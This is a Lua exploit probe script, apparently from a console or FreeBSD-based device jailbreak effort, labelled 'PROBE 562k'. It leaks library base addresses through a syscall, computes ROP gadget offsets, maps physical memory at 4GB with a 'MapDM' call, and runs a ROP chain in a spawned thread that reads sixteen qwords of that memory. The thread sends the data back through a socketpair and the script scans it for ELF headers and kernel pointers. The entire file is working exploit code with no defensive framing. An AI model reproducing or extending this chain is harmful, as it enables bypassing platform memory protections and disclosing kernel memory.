-- CRASH_CLASS: MODERATE
-- PROBE 562k: Physical memory read via child + socketpair output
--
-- CONFIRMED:
-- - Child thread reads MapDM'd phys memory (mmap stack, DEADFACE)
-- - fn_addr dispatch works for child syscalls (384b)
-- - "77" binary is from accessing MapDM'd pages in child (not gadgets)
-- - socketpair works (526a, 559e)
--
-- STRATEGY:
-- 1. Main: socketpair(AF_UNIX, SOCK_DGRAM) → rd_fd, wr_fd
-- 2. Main: MapDM phys page
-- 3. Child (mmap stack):
--    a. Read 16 qwords from mapped_va → shared buffer
--    b. Write sentinel (DEADFACE) to shared[0]
--    c. write(wr_fd, shared, 136) via fn_addr → sends data through socketpair
--    d. thr_exit(0) via fn_addr
-- 4. Main: poll sentinel, then read(rd_fd, ...) → clean data
-- 5. Main: format and print results (clean text!)
--
-- "77" goes to fd 1 but results come through socketpair fds.

print("=== PROBE 562k: PHYS READ (socketpair) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4

io.flush()

-- ============================================================
-- [A] Socketpair
-- ============================================================
print("")
print("[A] socketpair")
local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(2), Z, sv)  -- AF_UNIX, SOCK_DGRAM
end)
local rd_fd = rd(N(sv)) or -1
local wr_fd = rd(N(sv) + 4) or -1
print(string.format("ret=%d rd=%d wr=%d", ok_sp and N(rv_sp) or -999, rd_fd, wr_fd))
if rd_fd < 0 or wr_fd < 0 then print("ABORT: no socketpair"); return end
io.flush()

-- ============================================================
-- [B] MapDM phys 0x100000000 (4GB)
-- ============================================================
print("")
print("[B] MapDM phys 0x100000000")
local sc477 = mk(477)
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("MapDM rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [C] Build child ROP chain
-- ============================================================
print("")
print("[C] building chain")

-- Shared buffer: [0]=sentinel, [8..135]=16 qwords (128 bytes)
-- Total: 136 bytes
local shared = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(shared) + i, 0) end
local sh = N(shared)
local nq = 16
local data_len = 8 + nq * 8  -- 136 bytes

-- MMAP stack (required for MapDM access)
local ss = 0x4000
local ok_stk, sb_raw = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb = N(sb_raw)
local rsp = sb + ss - ((sb + ss) % 16) - 8

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- Phase 1: read 16 qwords from mapped_va → shared+8
for qi = 0, nq - 1 do
    emit(g_pop_rsi); emit(mapped_va + uint64(qi * 8))
    emit(g_mov_rax_m)
    emit(g_pop_rdi); emit(uint64(sh + 8 + qi * 8))
    emit(g_mov_m_rax)
end

-- Phase 2: write sentinel
emit(g_pop_rax); emit(uint64(0xDEADFACE))
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- Phase 3: write(wr_fd, shared, data_len) via fn_addr
-- rdi=wr_fd already? No, set explicitly.
emit(g_pop_rdi); emit(uint64(wr_fd))
emit(g_pop_rsi); emit(uint64(sh))
emit(g_pop_rdx); emit(uint64(data_len))
emit(g_pop_rax); emit(uint64(4))  -- SYS_write
emit(stub)

-- Phase 4: thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("chain: %d entries (%d bytes)", off/8, off))

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

io.flush()

-- ============================================================
-- [D] Spawn child
-- ============================================================
print("")
print("[D] spawning child...")
io.flush()

pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

-- Wait for sentinel in shared buffer
local found = false
for w = 1, 20000 do
    for j = 1, 50 do local x = j * j end
    local s = rb(sh) or 0
    if s == 0xDEADFACE then found = true; break end
end

-- ============================================================
-- [E] Read results from socketpair (clean path!)
-- ============================================================
-- Read from socketpair read fd
local result_buf = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(result_buf) + i, 0) end

local sc3 = mk(3)  -- read
local ok_rd, nread = pcall(function()
    return sc3(uint64(rd_fd), uint64(N(result_buf)), uint64(data_len))
end)
local nr = ok_rd and N(nread) or -999

-- Close socketpair
pcall(function() mk(6)(uint64(rd_fd)) end)
pcall(function() mk(6)(uint64(wr_fd)) end)

-- ============================================================
-- [F] Print results
-- ============================================================
io.flush()
print("")
print("========================================")
print(string.format("sentinel_in_shared=0x%X", rb(sh) or 0))
print(string.format("socketpair_read=%d bytes", nr))

if nr > 0 then
    -- Result buffer: [0..7]=sentinel, [8..135]=qwords
    local rbuf = N(result_buf)
    local sent = rb(rbuf) or 0
    print(string.format("sentinel_in_pipe=0x%X", sent))

    if sent == 0xDEADFACE then
        print("")
        print("*** PHYSICAL MEMORY AT 0x100000000 (4GB) ***")
        for qi = 0, nq - 1 do
            local lo = rb(rbuf + 8 + qi * 8) or 0
            local hi = rb(rbuf + 8 + qi * 8 + 4) or 0
            local tag = ""
            if qi == 0 and lo == 0x464C457F then tag = " *** ELF! ***" end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
            print(string.format("  [+%02X] 0x%08X_%08X%s", qi*8, hi, lo, tag))
        end
    else
        print("sentinel mismatch in pipe data")
    end
elseif found then
    print("socketpair read failed, but sentinel in shared OK")
    print("falling back to shared buffer:")
    for qi = 0, nq - 1 do
        local lo = rb(sh + 8 + qi * 8) or 0
        local hi = rb(sh + 8 + qi * 8 + 4) or 0
        print(string.format("  [+%02X] 0x%08X_%08X", qi*8, hi, lo))
    end
else
    print("TIMEOUT: child failed to read physical memory")
end

-- Cleanup
pcall(function() mk(73)(mapped_va, uint64(0x4000)) end)
pcall(function() mk(73)(sb_raw, uint64(ss)) end)

io.flush()
print("")
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562k DONE ===")
